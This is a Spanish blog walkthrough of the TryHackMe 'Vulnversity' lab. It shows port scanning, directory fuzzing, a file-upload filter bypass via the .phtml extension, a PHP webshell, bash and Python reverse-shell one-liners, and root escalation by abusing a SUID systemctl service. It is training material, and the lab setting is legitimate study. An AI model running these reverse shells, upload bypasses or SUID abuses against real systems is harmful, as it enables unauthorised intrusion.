---
layout: single
title: Máquina Vulnversity - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "Después de mucho tiempo, volvemos con la resolución de máquinas. En esta ocasión es la primera máquina del Path Offensive Pentesting de TryHackMe, Vulnvertisy. Una máquina muy sencilla para iniciar el path."
date: 2022-01-29
classes: wide
header:
  teaser: /assets/images/vulnversity/portada.png
  teaser_home_page: true
categories:
  - THM
  - Blog
tags:
  - Blog
  - Writeup
  - Guía
  - Walkthrough
---

# Aclaración inicial
La máquina se encuentra en la plataforma [TryHackMe](https://tryhackme.com/room/vulnversity) con instrucciones bastante detalladas para comprometerla paso a paso. Sin embargo, el objetivo de esta guía y de las siguientes es que nosotros intentemos comprometer el sistema sin la necesidad de ver las instrucciones que nos da la plataforma. Dicho esto, puedes seguir esta guía o la de TryHackMe, ya que ambas tienen mucho que ofrecer en cuanto a conocimientos.

# Reconocimiento
Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

	nmap --min-rate 5000 -p- --open -Pn -n 10.10.54.182 -oN portScan

![1]

Vemos que se encuentran habilitados el 21 (FTP), 22 (SSH), 139 y 445 (SMB) y dos puertos más (irrelevantes de momento).

Si realizamos un escaneo más exhaustivo en busca de servicios y versiones específicas de dichos puertos, nos encontramos con una gran cantidad de información:

	nmap -sC -sV -p21,22,139,445,3128,3333 10.10.54.182 -oN targeted
    
![2]

Vemos que el puerto 3333 (irrelevante hasta ahora) es en realidad un servicio HTTP que corre sobre Apache bajo el nombre de "Vulnversity".

# Servicio FTP
Si intentamos ingresar al servicio FTP por medio de una sesión como anónimo, veremos que el sistema no nos lo permite. Es decir, necesitamos credenciales váidas para acceder.

![3]

# Servicio HTTP
Si entramos al sitio web por medio de un navegador, nos encontraremos con la siguiente interfaz:

![4]

Ninguno de los botones parece tener funcionalidad alguna, así que suponemos que la vulnerabilidad debe estar en algún subdirectorio.

Realizamos un fuzing en busca de subdirectorios con wfuzz.
	
	wfuzz -c --hc=404 --hh=33014 -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2-3-medium.txt http://10.10.51.182/FUZZ
	
Recordemos que este comando corre wfuzz en formato colorizado (**-c**) escondiendo todos los resultados que deriven en un error 404 (**--hc=404**, es decir, no se encontró el recurso), escondiendo resultados que tengan un total de 33014 caracteres (**--hh=33014**, da falsos positivos si no se coloca), empleando **50 hilos** y el diccionario **directory-list-2-3-medium.txt** sobre el host víctima.

![5]

Nos encontramos con un directorio oculto llamado **internal**. Si accedemos a este directorio, veremos una interfaz para subir archivos al sistema:

![6]

Intentemos crear un archivo simple de ejemplo para ver qué ocurre.

![7]

![8]

Vemos que el sistema nos devuelve un error, idicando que la extensión del archivo no está permitida. Lo que vamos a intentar ahora es un ataque de fuerza bruta para tratar de identificar alguna extensión que sea válida en el sistema. Para ello, capturamos un envío de algún archivo con ayuda de BurpSuite:

![9]

Como podemos observar, el archivo viaja en la petición y somos capaces de modificar su extensión desde la misma petición. Llevamos esta al **Intruder** e intentamos un ataque de tipo **Sniper**.

Para ello, empleamos un pequeño diccionario de extensiones tales como:
	
	txt
	php
	sh
	php2
	php3
	php4
	php5
	jpg
	png
	jpeg
	pdf
	phtml

![10]

Si lanzamos el ataque, veremos que solo una extensión devuelve un **Success** como respuesta del lado del servidor, y es la extensión **phtml**.

![11]

El objetivo ahora es saber en dónde se almacenó ese archivo de prueba que enviamos, por lo que realizamos un nuevo escaneo; solo que ahora, dicho fuzzing se realizará dentro del nuevo directorio **internal**.

![12]

Es evidente que el directorio **uploads** debe contener nuestro archivo, por lo que accedemos a él a través de un navegador y nos encontramos lo siguiente:

![13]

# Acceso al sistema
Para este punto, ya tenemos una forma de subir archivos al sistema y de acceder a ellos. Es evidente que el siguiente paso es subir una reverse shell y ganar acceso inicial al sistema. Para ello, empleamos el siguiente código en php (recordando que el archivo debe tener extensión **phtml**).

![14]

Este código nos permitirá ejecutar RCE en la máquina víctima por medio del parámetro **cmd**. Si subimos el archivo y accedemos a él, enviando como comando de prueba un **whoami** veremos lo siguiente:

![15]

Como podemos apreciar, ya tenemos ejecución remota de comandos en el sistema, solo necesitamos ponernos a la escucha con **netcat** y entablar una reverse shell. Se intentó primero con el siguiente comando:

	bash -i >& /dev/tcp/10.10.51.182/443 0>&1
	
Sin embargo, no funcionó. Entonces, se intentó con la versión de python:

	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.51.182",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Esta sí nos devolvió la conexión y ya hemos ganado acceso al sistema.

![16]

# Escalada de privilegios
Lo primero que siempre se debe hacer al haber ganado acceso por medio de una reverse shell es un tratamiento de la TTY para evitar perder la conexión por un atajo de teclado no intencionado (CTRL+C). Para ello, escribimos el siguiente comando:

	script /dev/null -c bash
	
Ponemos en background la shell con CTRL+Z y escribimos el comando:

	stty raw -echo;fg
	
Luego escribimos:
	
	reset
	
En tipo de terminal ponemos:

	xterm
	
Por último, seteamos las variables de entorno necesarias:

	export TERM=xterm
	export SHELL=bash
	
Y listo, con esto ya tenemos una shell completamente interactiva.

![17]

Ahora, lo primero es obtener la flag de usuario, la cual se encuentra en el directorio del usuario **bill**.

![18]

Para escalar privilegios, primero enumeramos el sistema en busca de vulnerabilidades. Primero se intentó buscar comandos **sudo**, pero por desgracia, requerimos la contraseña del usuario para efectuar dicho comando, la cual desconocemos:

![18]

Buscamos ahora por **binarios SUID**, y nos encontramos con lo siguiente:

![19]

# Abuso del binario systemctl con SUID
El binario **systemctl** nos permitiría escalar privilegios dependiendo de cómo enfoquemos el ataque. **GTFObins** nos da instrucciones sobre cómo emplear este binario, pero yo prefiero la explicación de esta [página web](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740).

Básicamente, requerimos crear un nuevo servicio que tenga la siguiente estructura:

![20]

Donde en la sección **ExecStart** colocaremos el comando que queremos que el usuario privilegiado ejecute por nosotros. Puede ser una reverse shell, pero en mi caso, volveré SUID al binario /bin/bash para acceder directamente desde la máquina como **root**:

	chmod +s /bin/bash
	
Ahora, solo debemos ejecutar los siguientes comandos en Linux:

	/bin/systemctl enable /dev/shm/root.service
	/bin/systemctl start root
	
Recuerda que el archivo **root.service** puede llamarse como quieras (siempre y cuando coloques el mismo nombre en los comandos) y que debe estar ubicado en un directorio donde tengas permisos de escritura. En este caso, se colocó en el directorio **tmp**.

![21]

Por último, solo debemos acceder a la bash como root empleando el comando:

	bash -p
	
Como podemos observar, ya somos usuario **root** y podemos ver la flag correspondiente.

![21]
	
[0]:/assets/images/vulnversity/0.png
[1]:/assets/images/vulnversity/1.png
[2]:/assets/images/vulnversity/2.png
[3]:/assets/images/vulnversity/3.png
[4]:/assets/images/vulnversity/4.png
[5]:/assets/images/vulnversity/5.png
[6]:/assets/images/vulnversity/6.png
[7]:/assets/images/vulnversity/7.png
[8]:/assets/images/vulnversity/8.png
[9]:/assets/images/vulnversity/9.png
[10]:/assets/images/vulnversity/10.png
[11]:/assets/images/vulnversity/11.png
[12]:/assets/images/vulnversity/12.png
[13]:/assets/images/vulnversity/13.png
[14]:/assets/images/vulnversity/14.png
[15]:/assets/images/vulnversity/15.png
[16]:/assets/images/vulnversity/16.png
[17]:/assets/images/vulnversity/17.png
[18]:/assets/images/vulnversity/18.png
[19]:/assets/images/vulnversity/19.png
[20]:/assets/images/vulnversity/20.png
[21]:/assets/images/vulnversity/21.png